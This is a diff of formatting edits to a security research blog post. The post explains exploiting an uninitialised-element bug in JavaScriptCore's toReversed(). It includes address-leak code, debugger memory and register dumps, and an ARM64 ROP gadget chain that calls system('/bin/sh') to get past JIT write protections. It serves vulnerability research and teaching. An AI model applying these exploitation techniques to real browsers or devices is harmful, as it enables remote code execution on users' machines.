@@ -157,7 +157,7 @@ print(v2[2].print()); // access randomly a field of v2[2]
 
 After running this PoC, the program crashes when trying to access a field in an uninitialized element. This behavior confirms that `toReversed()` misses properly initialising additional elements when `publicLength` is smaller than `vectorLength`. 
 
-```cpp
+```yaml
 Object: 0x7fc8ab0094c8 with butterfly 0x7fc8a90927e8(base=0x7fc8a90927e0) (Structure 0x7fc7000060f0:[0x60f0/24816, Array, (0/0, 0/0){}, ArrayWithContiguous, Unknown, Proto:0x7fc8ab008988]), StructureID: 24816
 
 pwndbg> tele 0x7fc8a90927e0
@@ -247,9 +247,10 @@ The fix in commit 9158c52 simply `memset` all remaining values to 0, NaN, or Und
 ### Turning into read/write primitives 
 
 The next step is to gain arbitrary read/write. In order to do that, let's again illustrate the internal array structure in JavaScriptCore. From the Frack article Attacking JavaScript Engines, Saleo describe butterfly concept in general as:
+
  “Internally, JSC stores both properties and elements in the same memory region and stores a pointer to that region in the object itself. This pointer points to the middle of the region, properties are stored to the left of it (lower addresses) and elements to the right of it. There is also a small header located just before the pointed to address that contains the length of the element vector. This concept is called a "Butterfly" since the values expand to the left and right, similar to the wings of a butterfly.”
 
-![](b.png)
+![image1](b.png)
 
 ### Leaking addresses 
 
@@ -270,6 +271,7 @@ print ("leak1: " + hex(addr1));
 ```
 
 ### Achieve Arbitrary Memory Write/Read
+
 With a successful heap leak, we can now work towards crafting a fake object and achieving arbitrary read/write access:
 
 Heap spraying for fake objects: We allocate a large number of pointers pointing to a predictable area inside the heap. Those pointers will be interpreted as object pointers when a `toReversed()` object array catches them.
@@ -289,9 +291,9 @@ At this point, we gain three key primitives:
 
 With full read/write capabilities, we are now ready to take the final step—achieving code execution, breaking through JavaScriptCore’s security defenses.
 Code execution
-After getting arbitrary read/write primitive, we easily overwrite shellcode into the JIT compiled page, and obtain shell execution:
 
-![](c.png)
+After getting arbitrary read/write primitive, we easily overwrite shellcode into the JIT compiled page, and obtain shell execution.
+
 
 ## Exploitation on macOS machine (ARM64 architecture)
 
@@ -301,11 +303,11 @@ With code execution successfully achieved on Linux (x86-64), our next challenge 
 
 On macOS running Apple Mx chips, several security mitigations prevent traditional exploitation techniques:
 
-JIT Memory Protections: Unlike x86-64, JIT pages are no longer RWX (Read-Write-Execute). Instead, they are mapped as RX (Read-Execute) only, preventing attackers from injecting shellcode directly into executable memory.
+**JIT Memory Protections**: Unlike x86-64, JIT pages are no longer RWX (Read-Write-Execute). Instead, they are mapped as RX (Read-Execute) only, preventing attackers from injecting shellcode directly into executable memory.
 
-Pointer Authentication (PAC): Many function pointers and return addresses are protected with PAC (Pointer Authentication Codes), making arbitrary code execution more difficult.
+**Pointer Authentication (PAC)**: Many function pointers and return addresses are protected with PAC (Pointer Authentication Codes), making arbitrary code execution more difficult.
 
-APRR (Authenticated Pointer Read Restriction): Certain memory regions, including JIT code pages, are protected from direct reading, which makes memory disclosure attacks less effective.
+**APRR (Authenticated Pointer Read Restriction)**: Certain memory regions, including JIT code pages, are protected from direct reading, which makes memory disclosure attacks less effective.
 
 Our next step was bypassing JIT memory protections, since our previous approach of injecting shellcode into JIT pages no longer worked. And in this blog we only discuss how to overcome this mitigation, because others are more hardly touchable for us now. 
 
@@ -319,7 +321,8 @@ When JIT compiles code, the page is temporarily marked RW (Read-Write) but not e
 Once the JIT compilation is finished, the page is switched to RX (Read-Execute) but not writable.
 
 For example, the function `performJITMemcpy` function as the case enables writing permission on JIT page, but disable as soon as after `memcpy` function. 
-```
+
+```c++
 static ALWAYS_INLINE void* performJITMemcpy(void *dst, const void *src, size_t n)
 {
    //...
@@ -338,8 +341,10 @@ Instead of modifying JIT code itself, we leveraged existing executable instructi
 Our approach was as follows:
 
 1. Leaking JSC address base and system() function address
+
 By arbitrary read/write, we can easily leak JSC base address and other system functions:
-```
+
+```js
 const jscBase = mathExpAddr - JSC_BASE_TO_MATH_EXP;
 print("jscBase: " + hex(jscBase));
 
@@ -353,9 +358,10 @@ print("system_addr: " + hex(system_addr));
 ```
 
 2. Constructing the ROP Chain
+
 Next step, we overwrite the JIT code address with a crafted ROP chain. Before directly jumping to a code address, we realized that we could control the x21 register’s memory, making it a useful target for gadget chaining.
 
-```asm
+```yaml
 (lldb) reg r
 General Purpose Registers:
        x0 = 0x000000010306c8dc 
@@ -397,8 +403,9 @@ General Purpose Registers:
 We then looked for gadgets that interact with x21, and found two key instruction sequences:
 
 First Gadget: Modifying x0, x8, and x3, then branching to x3
+
 This gadget enables us to control x0 (first function argument), x8 (load base), and x3 (function jump target) before executing a branch instruction (br x3):
-```asm
+```yaml
 (lldb) x/10i 0x10306c8dc
 ->  0x10306c8dc: ldr    x0, [x21, #0x10]  // Load value from x21 into x0
    0x10306c8e0: ldr    x8, [x0]          // Load x0’s base into x8
@@ -411,19 +418,19 @@ This gadget enables us to control x0 (first function argument), x8 (load base), 
    0x10306c8fc: add    sp, sp, #0x40
    0x10306c900: br     x3                // Jump to x3 (controlled)
 ```
+
 Second Gadget: Modifying x1 and x0, then branching to x1
+
 This gadget allows us to set up x1 (second function argument) and x0 (first function argument) before branching to x1, effectively calling a function:
-```asm
+
+```yaml
 (lldb) x/10i 0x103ec014
 ->  0x103ec014: ldr    x1, [x8, #0x18]  // Load x1
    0x103ec018: ldr    x0, [x0, #0x58]  // Load x0
    0x103ec01c: br     x1               // Branch to x1 (controlled function call)
 ```
+
 By combining these two gadgets, we can load the system() function address into x1, prepare its argument ("/bin/sh") in x0, and execute the call, effectively launching a shell.
-
-Using this ROP-based approach, we successfully bypassed JIT memory protections and achieved code execution on macOS as the below image:
-
-![](d.png)
 
 ### The PAC Roadblock
 
@@ -432,7 +439,9 @@ Using this ROP-based approach, we successfully bypassed JIT memory protections a
 
 ## Summary
 
-  In this blog, we explored JavaScriptCore exploitation, on x86-64 architecture and overcame one arm64 mitigation. This project was a valuable learning experience for us, laying the foundation for future Safari and JavaScriptCore research. During understanding mitigation, we found the blog [JITSploitation III](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-three.html): Subverting Control Flow, Saelo had described JIT memory protection as the small part of APRR “With the APRR register set up in this way, it would effectively enforce a strict W^X policy: no page could ever be writable and executable at the same time. So we were confused to explain both mitigations, in the end we decided to point out only JIT memory protection as we only discuss bypassing itself. If something goes wrong because lacking of our knowledge, please let us know, thank you everyone for reading our blog. 
+In this blog, we explored JavaScriptCore exploitation, on x86-64 architecture and overcame one arm64 mitigation. This project was a valuable learning experience for us, laying the foundation for future Safari and JavaScriptCore research. 
+
+During understanding mitigation, we found the blog [JITSploitation III](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-three.html): Subverting Control Flow, Saelo had described JIT memory protection as the small part of APRR “With the APRR register set up in this way, it would effectively enforce a strict W^X policy: no page could ever be writable and executable at the same time". So we were confused to explain both mitigations, in the end we decided to point out only JIT memory protection as we only discuss bypassing itself. If something goes wrong because lacking of our knowledge, please let us know, thank you everyone for reading our blog. 
 
 The PoC and exploitation scripts are available [here]([https://github.com/qriousec/qriousec.github.io/tree/main/content/post/jsc-uninit](https://github.com/qriousec/qriousec.github.io/blob/main/content/post/jsc-uninit/arm64-shellcode-less.js)).
 
